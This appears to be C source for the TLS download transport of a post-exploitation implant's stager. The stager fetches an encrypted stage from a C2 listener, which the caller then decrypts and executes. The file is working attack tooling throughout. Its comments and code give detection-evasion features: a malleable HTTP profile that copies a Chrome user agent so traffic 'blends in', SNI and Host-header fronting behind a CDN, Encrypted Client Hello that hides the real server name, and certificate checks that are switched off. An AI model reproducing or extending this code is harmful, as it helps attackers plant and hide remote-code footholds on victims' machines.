/*
 * transport_libssl.c — libssl (OpenSSL) HTTPS transport with a malleable
 * HTTP profile.
 *
 * Downloads the stage blob over TLS using the OpenSSL shared library, loaded
 * at runtime through dynload.h. No OpenSSL headers or link-time dependency are
 * required; the small stable ABI subset used here is declared below. TLS is
 * normally terminated by nginx/CDN in front of the listener, so this transport
 * is what you reach for when the raw `http` transport cannot speak TLS and
 * libcurl is not available on the target.
 *
 * The request it emits is deliberately malleable: the method, URI, Host,
 * User-Agent and any extra headers can be adjusted to match the C2 profile so
 * the download blends in with legitimate traffic. The defaults below are
 * compile-time overridable with -D; the "Environment tuning" block lists every
 * knob a user is likely to change.
 *
 * ==========================================================================
 * Environment tuning — where to change things
 * ==========================================================================
 *
 * 1. LIBSONAMES below: the OpenSSL sonames tried at runtime, newest first.
 *    Match the target's OpenSSL (libssl.so.4 for OpenSSL 4.x, .3 for 3.x, .1.1
 *    for 1.1.1, .1.0.0 for older). Some embedded systems expose only
 *    "libssl.so".
 *
 * 2. MALLEABLE_TLS_SNI: the SNI / certificate hostname presented in the
 *    handshake. Defaults to the download host. Set this when the target dials
 *    an IP address or one CDN address but the endpoint serves a named vhost
 *    (e.g. -DMALLEABLE_TLS_SNI='"cdn.example.com"'). An empty value uses the
 *    host passed on the command line.
 *
 * 3. Certificate verification is disabled (SSL_VERIFY_NONE) so self-signed
 *    listener certificates work out of the box. For a pinned/CA-signed
 *    deployment, load a trust store and use SSL_CTX_set_verify() with
 *    SSL_VERIFY_PEER instead — see the call site below.
 *
 * 4. MALLEABLE_HTTP_METHOD: the HTTP verb (default "GET"). Override it here
 *    only when the C2 profile expects POST; the URI is normally controlled
 *    from the build (build.sh --download-path) and is used verbatim.
 *
 * 5. MALLEABLE_HOST_HEADER: leave empty to derive "host[:port]" from the
 *    download host/port. Set it to a bare domain when the real destination is
 *    a shared CDN/IP and the Host header must name the vhost.
 *
 * 6. MALLEABLE_USER_AGENT / MALLEABLE_HTTP_HEADERS / MALLEABLE_HTTP_BODY:
 *    change these to mirror the browser or application traffic the profile
 *    impersonates. MALLEABLE_HTTP_HEADERS is appended verbatim, one
 *    "Name: value\r\n" per header.
 *
 * 7. SO_RCVTIMEO/SO_SNDTIMEO are set on the socket below. Raise them for slow
 *    links/satellite, lower them for a fast fail-over.
 *
 * 8. Encrypted Client Hello (ECH) is available for the libssl transport only,
 *    and only when the target's OpenSSL supports it (OpenSSL 4.0+, the first
 *    release exporting SSL_set1_ech_config_list; RFC 9849). It is a build-time
 *    opt-in: see the "Encrypted Client Hello" section below. When ECH is not
 *    requested, not configured, or the runtime libssl lacks it, the transport
 *    silently falls back to a normal TLS handshake.
 *
 * Notes / limitations:
 *   - HTTP/1.1 only; no ALPN is advertised, so a server that defaults to h2
 *     still answers with HTTP/1.1.
 *   - Redirects are not followed. Point --download-path at the final URL.
 *   - Chunked transfer-encoding is not decoded; the listener must send
 *     Content-Length or close the connection (the built-in listener does).
 */

#include "dynload.h"
#include "net_utils.h"
#include "transport.h"
#include "utils.h"

/* --------------------------------------------------------------------------
 * Environment tuning
 * ------------------------------------------------------------------------ */

/* OpenSSL sonames to try, newest first. Max 15 chars (see the fixed-width
 * rows below). libssl.so.4 is OpenSSL 4.x, the first branch with ECH. */
static const char LIBSONAMES[][16] = {"libssl.so.4", "libssl.so.3",
                                      "libssl.so.1.1", "libssl.so.1.0.0"};

/* SNI / cert hostname; empty means "use the download host". */
#ifndef MALLEABLE_TLS_SNI
#define MALLEABLE_TLS_SNI ""
#endif

/* HTTP method; empty/undefined falls back to GET. */
#ifndef MALLEABLE_HTTP_METHOD
#define MALLEABLE_HTTP_METHOD "GET"
#endif

/* Host header; empty derives "host[:port]" from the download target. */
#ifndef MALLEABLE_HOST_HEADER
#define MALLEABLE_HOST_HEADER ""
#endif

/* Browser/application identity to present. */
#ifndef MALLEABLE_USER_AGENT
#define MALLEABLE_USER_AGENT                                                   \
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "              \
  "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
#endif

/* Extra raw header lines, each terminated with \r\n. */
#ifndef MALLEABLE_HTTP_HEADERS
#define MALLEABLE_HTTP_HEADERS ""
#endif

/* Request body, sent only when non-empty (Content-Length is added). */
#ifndef MALLEABLE_HTTP_BODY
#define MALLEABLE_HTTP_BODY ""
#endif

/* Socket send/recv timeouts in seconds. */
#ifndef MALLEABLE_TIMEOUT_SEC
#define MALLEABLE_TIMEOUT_SEC 15
#endif

/* --------------------------------------------------------------------------
 * Encrypted Client Hello (ECH) — build-time opt-in
 *
 * ECH hides the real (inner) server name from a passive observer: the outer
 * SNI that actually appears on the wire is the public_name from the embedded
 * ECHConfigList. It needs TLS 1.3 and an ECH-capable front (e.g. Cloudflare);
 * emp3r0r's own listener does not speak ECH, so this is for deployments
 * fronted by a CDN.
 *
 * How to enable:
 *   1. Obtain the base64 ECHConfigList from the front domain's DNS HTTPS RR:
 *        dig +short HTTPS cdn.example.com
 *      Take the value after "ech=" (drop the surrounding quotes).
 *   2. Build with ECH on and that list:
 *        ./build.sh --transport libssl --ech on --ech-config '<base64>' ...
 *      or, with make directly:
 *        make ECH=1 ECH_CONFIG='<base64>' TRANSPORT=libssl
 *   3. Point --download-host (or MALLEABLE_TLS_SNI) at a real hostname, not an
 *      IP: the inner SNI must be a DNS name for ECH to be meaningful.
 *
 * Runtime behaviour:
 *   - SSL_set1_ech_config_list() accepts base64 or binary; we pass the base64
 *     form so no decoder is needed.
 *   - The symbol is resolved from libssl at runtime. If the library has no ECH
 *     (OpenSSL < 4.0), or the config list is empty/rejected, we log and carry
 *     on with a normal TLS handshake instead of aborting the download. This is
 *     what "support ECH if libssl allows" means in practice.
 *   - The inner SNI is whatever host was dialed (or MALLEABLE_TLS_SNI); ECH
 *     substitutes the configured public_name as the outer SNI automatically.
 * ------------------------------------------------------------------------ */
#ifndef MALLEABLE_ENABLE_ECH
#define MALLEABLE_ENABLE_ECH 0
#endif

#if MALLEABLE_ENABLE_ECH
/* Base64 ECHConfigList; empty means "ECH requested but not configured". */
#ifndef MALLEABLE_ECH_CONFIG
#define MALLEABLE_ECH_CONFIG ""
#endif
#endif

#define READ_CHUNK 16384
#define REQUEST_BUF_SIZE 4096

/* --------------------------------------------------------------------------
 * Minimal libssl ABI (stable across 1.0/1.1/3.x/4.x for the calls we use)
 * ------------------------------------------------------------------------ */

typedef struct ssl_ctx_st SSL_CTX;
typedef struct ssl_st SSL;
typedef struct ssl_method_st SSL_METHOD;

/* SSL_CTX_set_verify modes. */
#define SSL_VERIFY_NONE 0

/* SSL_ctrl() selectors used to set SNI (SSL_set_tlsext_host_name is a macro
 * in OpenSSL headers, so we call SSL_ctrl directly). */
#define SSL_CTRL_SET_TLSEXT_HOSTNAME 55
#define TLSEXT_NAMETYPE_host_name 0

/* OpenSSL <= 1.0.2 has no OPENSSL_init_ssl; SSL_library_init is optional. */
typedef int (*openssl_init_ssl_fn)(unsigned long long, const void *);
typedef int (*ssl_library_init_fn)(void);
typedef const SSL_METHOD *(*client_method_fn)(void);
typedef SSL_CTX *(*ssl_ctx_new_fn)(const SSL_METHOD *);
typedef void (*ssl_ctx_free_fn)(SSL_CTX *);
typedef void (*ssl_ctx_set_verify_fn)(SSL_CTX *, int, void *);
typedef SSL *(*ssl_new_fn)(SSL_CTX *);
typedef void (*ssl_free_fn)(SSL *);
typedef int (*ssl_set_fd_fn)(SSL *, int);
typedef long (*ssl_ctrl_fn)(SSL *, int, long, void *);
typedef int (*ssl_connect_fn)(SSL *);
typedef int (*ssl_write_fn)(SSL *, const void *, int);
typedef int (*ssl_read_fn)(SSL *, void *, int);
typedef int (*ssl_shutdown_fn)(SSL *);
#if MALLEABLE_ENABLE_ECH
typedef int (*ssl_set1_ech_config_list_fn)(SSL *, const uint8_t *, size_t);
#endif

typedef struct {
  void *lib;
  openssl_init_ssl_fn init_ssl;
  ssl_library_init_fn library_init;
  client_method_fn client_method;
  ssl_ctx_new_fn ctx_new;
  ssl_ctx_free_fn ctx_free;
  ssl_ctx_set_verify_fn ctx_set_verify;
  ssl_new_fn ssl_new;
  ssl_free_fn ssl_free;
  ssl_set_fd_fn set_fd;
  ssl_ctrl_fn ctrl;
  ssl_connect_fn connect;
  ssl_write_fn write;
  ssl_read_fn read;
  ssl_shutdown_fn shutdown;
#if MALLEABLE_ENABLE_ECH
  ssl_set1_ech_config_list_fn set1_ech_config_list;
  int ech_available; /* 1 = runtime libssl exports ECH entry points */
#endif
} ssl_api;

/* Resolve the libssl entry points. Returns 0 if the library or any required
 * symbol is unavailable. */
static int libssl_load(ssl_api *api) {
  memset(api, 0, sizeof(*api));

  size_t nsons = sizeof(LIBSONAMES) / sizeof(LIBSONAMES[0]);
  for (size_t i = 0; i < nsons; i++) {
    api->lib = dynload_open(LIBSONAMES[i], RTLD_NOW | RTLD_LOCAL);
    if (api->lib) {
      debug_print("libssl: loaded %s\n", LIBSONAMES[i]);
      break;
    }
  }
  if (!api->lib)
    return 0;

  api->init_ssl =
      (openssl_init_ssl_fn)dynload_sym(api->lib, "OPENSSL_init_ssl");
  api->library_init =
      (ssl_library_init_fn)dynload_sym(api->lib, "SSL_library_init");
  api->client_method =
      (client_method_fn)dynload_sym(api->lib, "TLS_client_method");
  if (!api->client_method)
    api->client_method =
        (client_method_fn)dynload_sym(api->lib, "SSLv23_client_method");
  api->ctx_new = (ssl_ctx_new_fn)dynload_sym(api->lib, "SSL_CTX_new");
  api->ctx_free = (ssl_ctx_free_fn)dynload_sym(api->lib, "SSL_CTX_free");
  api->ctx_set_verify =
      (ssl_ctx_set_verify_fn)dynload_sym(api->lib, "SSL_CTX_set_verify");
  api->ssl_new = (ssl_new_fn)dynload_sym(api->lib, "SSL_new");
  api->ssl_free = (ssl_free_fn)dynload_sym(api->lib, "SSL_free");
  api->set_fd = (ssl_set_fd_fn)dynload_sym(api->lib, "SSL_set_fd");
  api->ctrl = (ssl_ctrl_fn)dynload_sym(api->lib, "SSL_ctrl");
  api->connect = (ssl_connect_fn)dynload_sym(api->lib, "SSL_connect");
  api->write = (ssl_write_fn)dynload_sym(api->lib, "SSL_write");
  api->read = (ssl_read_fn)dynload_sym(api->lib, "SSL_read");
  api->shutdown = (ssl_shutdown_fn)dynload_sym(api->lib, "SSL_shutdown");
#if MALLEABLE_ENABLE_ECH
  /* Optional: only present on OpenSSL 4.0+. Its absence is not an error. */
  api->set1_ech_config_list = (ssl_set1_ech_config_list_fn)dynload_sym(
      api->lib, "SSL_set1_ech_config_list");
  api->ech_available = (api->set1_ech_config_list != NULL);
#endif

  if (!api->client_method || !api->ctx_new || !api->ctx_free ||
      !api->ctx_set_verify || !api->ssl_new || !api->ssl_free || !api->set_fd ||
      !api->connect || !api->write || !api->read) {
    dynload_close(api->lib);
    api->lib = NULL;
    return 0;
  }
  return 1;
}

static void libssl_unload(ssl_api *api) {
  if (api->lib) {
    dynload_close(api->lib);
    api->lib = NULL;
  }
}

#if MALLEABLE_ENABLE_ECH
/* Attach the configured ECHConfigList to the connection. This never fails the
 * download: when libssl has no ECH, no config was embedded, or libssl rejects
 * the config, we log and let the caller continue with normal TLS. */
static void ech_configure(ssl_api *api, SSL *ssl) {
  if (!api->ech_available) {
    debug_print("ECH: requested but this libssl has no ECH support "
                "(need OpenSSL 4.0+); continuing without ECH\n");
    return;
  }
  if (MALLEABLE_ECH_CONFIG[0] == '\0') {
    debug_print("ECH: enabled but no ECHConfigList was embedded (build with "
                "--ech-config <base64>); continuing without ECH\n");
    return;
  }
  /* The dialed host (or MALLEABLE_TLS_SNI) is the inner SNI; ECH supplies the
   * outer SNI from the config's public_name, so nothing else is needed here. */
  if (api->set1_ech_config_list(ssl, (const uint8_t *)MALLEABLE_ECH_CONFIG,
                                strlen(MALLEABLE_ECH_CONFIG)) == 1) {
    debug_print("ECH: ECHConfigList accepted\n");
  } else {
    debug_print("ECH: libssl rejected the ECHConfigList; continuing without "
                "ECH\n");
  }
}
#endif

/* --------------------------------------------------------------------------
 * Small request builder (no snprintf in a -nostdlib stager)
 * ------------------------------------------------------------------------ */

typedef struct {
  char *buf;
  size_t cap;
  size_t len;
  int ok;
} req_builder;

static void rb_append(req_builder *rb, const char *s) {
  if (!rb->ok)
    return;
  size_t n = strlen(s);
  if (rb->len + n + 1 > rb->cap) {
    rb->ok = 0;
    return;
  }
  memcpy(rb->buf + rb->len, s, n);
  rb->len += n;
  rb->buf[rb->len] = '\0';
}

static void rb_append_uint(req_builder *rb, unsigned int v) {
  char tmp[11];
  int i = 10;
  tmp[i] = '\0';
  if (v == 0) {
    rb_append(rb, "0");
    return;
  }
  while (v > 0 && i > 0) {
    tmp[--i] = (char)('0' + (v % 10));
    v /= 10;
  }
  rb_append(rb, tmp + i);
}

/* Build the malleable HTTP/1.1 request. Returns the request length, or 0 on
 * overflow. */
static size_t build_request(char *buf, size_t cap, const char *host,
                            const char *port, const char *path) {
  req_builder rb = {buf, cap, 0, 1};

  const char *method =
      (MALLEABLE_HTTP_METHOD[0] != '\0') ? MALLEABLE_HTTP_METHOD : "GET";
  const char *uri = (path && path[0] != '\0') ? path : "/";

  rb_append(&rb, method);
  rb_append(&rb, " ");
  rb_append(&rb, uri);
  rb_append(&rb, " HTTP/1.1\r\nHost: ");

  if (MALLEABLE_HOST_HEADER[0] != '\0') {
    rb_append(&rb, MALLEABLE_HOST_HEADER);
  } else {
    rb_append(&rb, host);
    /* Omit the default HTTPS port, mirroring a browser. */
    if (strcmp(port, "443") != 0) {
      rb_append(&rb, ":");
      rb_append(&rb, port);
    }
  }

  rb_append(&rb, "\r\nUser-Agent: ");
  rb_append(&rb, MALLEABLE_USER_AGENT);
  rb_append(&rb, "\r\nAccept: */*\r\nConnection: close\r\n");
  rb_append(&rb, MALLEABLE_HTTP_HEADERS);

  if (MALLEABLE_HTTP_BODY[0] != '\0') {
    rb_append(&rb, "Content-Length: ");
    rb_append_uint(&rb, (unsigned int)strlen(MALLEABLE_HTTP_BODY));
    rb_append(&rb, "\r\n");
  }
  rb_append(&rb, "\r\n");
  rb_append(&rb, MALLEABLE_HTTP_BODY);

  return rb.ok ? rb.len : 0;
}

/* --------------------------------------------------------------------------
 * TLS plumbing
 * ------------------------------------------------------------------------ */

static int ssl_write_all(ssl_api *api, SSL *ssl, const char *buf, size_t len) {
  size_t sent = 0;
  while (sent < len) {
    int n = api->write(ssl, buf + sent, (int)(len - sent));
    if (n <= 0)
      return 0;
    sent += (size_t)n;
  }
  return 1;
}

/* Reject redirects and error pages early so the caller never RC4-decrypts and
 * jumps into an HTML body. The status line is always "HTTP/1.x NNN". */
static int status_is_2xx(const char *s, size_t len) {
  if (len < 12)
    return 0;
  if (s[0] != 'H' || s[1] != 'T' || s[2] != 'T' || s[3] != 'P' || s[4] != '/' ||
      s[5] != '1' || s[6] != '.')
    return 0;
  if ((s[7] != '0' && s[7] != '1') || s[8] != ' ')
    return 0;
  return s[9] == '2';
}

/* Read the TLS stream, skip the HTTP response headers and copy the body into
 * the caller buffer. Returns body bytes (0 on error or non-2xx status). */
static size_t ssl_read_body(ssl_api *api, SSL *ssl, void *buffer,
                            size_t capacity) {
  char temp[READ_CHUNK];
  char status[12];
  size_t status_len = 0;
  size_t data_size = 0;
  int header_end = 0;
  unsigned int marker = 0;
  const char *delim = "\r\n\r\n";

  for (;;) {
    int n = api->read(ssl, temp, (int)sizeof(temp));
    if (n <= 0)
      break;

    /* Capture the leading status-line bytes for the 2xx check. */
    if (status_len < sizeof(status)) {
      size_t want = sizeof(status) - status_len;
      size_t take = (size_t)n < want ? (size_t)n : want;
      memcpy(status + status_len, temp, take);
      status_len += take;
    }

    if (!header_end) {
      for (int i = 0; i < n; i++) {
        if (temp[i] == delim[marker]) {
          marker++;
          if (marker == 4) {
            header_end = 1;
            if (!status_is_2xx(status, status_len))
              return 0;
            size_t body = (size_t)(n - (i + 1));
            if (data_size + body > capacity)
              return 0;
            memcpy((char *)buffer + data_size, temp + i + 1, body);
            data_size += body;
            break;
          }
        } else {
          marker = ((unsigned char)temp[i] == (unsigned char)delim[0]) ? 1 : 0;
        }
      }
    } else {
      if (data_size + (size_t)n > capacity)
        return 0;
      memcpy((char *)buffer + data_size, temp, (size_t)n);
      data_size += (size_t)n;
    }
  }

  return data_size;
}

/* --------------------------------------------------------------------------
 * Transport entry points
 * ------------------------------------------------------------------------ */

static size_t libssl_download(const char *host, const char *port,
                              const char *path, void *buffer, size_t capacity,
                              const uint8_t *key) {
  (void)key;

  struct sockaddr_in serv_addr;
  if (resolve_addr(host, port, &serv_addr) != 0) {
    debug_print("libssl: cannot resolve %s:%s\n", host, port);
    return 0;
  }

  int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (sockfd == -1)
    return 0;
  if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == -1) {
    close(sockfd);
    return 0;
  }

  /* Bound the handshake and transfer so a dead endpoint cannot hang the
   * stager forever. Adjust MALLEABLE_TIMEOUT_SEC for slow links. */
  struct timeval tv;
  tv.tv_sec = MALLEABLE_TIMEOUT_SEC;
  tv.tv_usec = 0;
  setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

  ssl_api api;
  if (!libssl_load(&api)) {
    debug_print("libssl: no usable libssl found\n");
    close(sockfd);
    return 0;
  }

  size_t result = 0;
  SSL_CTX *ctx = NULL;
  SSL *ssl = NULL;

  if (api.init_ssl)
    api.init_ssl(0, NULL);
  else if (api.library_init)
    api.library_init();

  ctx = api.ctx_new(api.client_method());
  if (!ctx) {
    debug_print("libssl: SSL_CTX_new failed\n");
    goto cleanup;
  }

  /* Self-signed listener certs: no verification. Replace with SSL_VERIFY_PEER
   * plus a loaded trust store if you pin the C2 certificate. */
  api.ctx_set_verify(ctx, SSL_VERIFY_NONE, NULL);

  ssl = api.ssl_new(ctx);
  if (!ssl) {
    debug_print("libssl: SSL_new failed\n");
    goto cleanup;
  }
  if (api.set_fd(ssl, sockfd) != 1) {
    debug_print("libssl: SSL_set_fd failed\n");
    goto cleanup;
  }

#if MALLEABLE_ENABLE_ECH
  /* Optional ECH; falls back to normal TLS when unsupported/unconfigured. */
  ech_configure(&api, ssl);
#endif

  /* SNI: lets a shared CDN/IP endpoint select the right vhost. Defaults to the
   * dialed host; override MALLEABLE_TLS_SNI when the target dials an IP but
   * the certificate names a domain. When ECH is active this is the inner SNI;
   * the outer SNI comes from the ECHConfigList's public_name. */
  if (api.ctrl) {
    const char *sni = (MALLEABLE_TLS_SNI[0] != '\0') ? MALLEABLE_TLS_SNI : host;
    api.ctrl(ssl, SSL_CTRL_SET_TLSEXT_HOSTNAME, TLSEXT_NAMETYPE_host_name,
             (void *)sni);
  }

  if (api.connect(ssl) != 1) {
    debug_print("libssl: TLS handshake failed\n");
    goto cleanup;
  }

  char request[REQUEST_BUF_SIZE];
  size_t req_len = build_request(request, sizeof(request), host, port, path);
  if (req_len == 0) {
    debug_print("libssl: request too large\n");
    goto cleanup;
  }

  if (!ssl_write_all(&api, ssl, request, req_len)) {
    debug_print("libssl: request send failed\n");
    goto cleanup;
  }

  result = ssl_read_body(&api, ssl, buffer, capacity);
  if (result == 0)
    debug_print("libssl: no body (or non-2xx response)\n");

cleanup:
  if (ssl) {
    if (api.shutdown)
      api.shutdown(ssl);
    api.ssl_free(ssl);
  }
  if (ctx)
    api.ctx_free(ctx);
  close(sockfd);
  libssl_unload(&api);
  return result;
}

const char *transport_name(void) { return "libssl"; }

size_t transport_download(const char *host, const char *port, const char *path,
                          void *buffer, size_t capacity, const uint8_t *key) {
  return libssl_download(host, port, path, buffer, capacity, key);
}
